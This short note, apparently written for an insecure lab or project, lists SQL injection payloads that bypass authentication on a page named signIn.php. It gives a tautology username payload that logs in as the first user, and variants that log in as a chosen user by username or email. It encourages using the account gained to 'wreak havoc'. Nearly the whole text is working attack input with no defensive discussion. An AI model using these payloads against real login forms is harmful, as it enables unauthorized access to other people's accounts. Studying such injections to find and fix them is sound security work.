- Auth Bypass on signIn.php
  1. username => 'or '1'='1' -- '
  2. You can use this attack to get the first user, if you do not any username prior to your attempt.
  3. You can then use this user to wreak havoc.

* Auth a specific user by a known unique field
  username => 'or username='smb' -- '
  or
  username => 'or email='smb@gmail.com' -- '
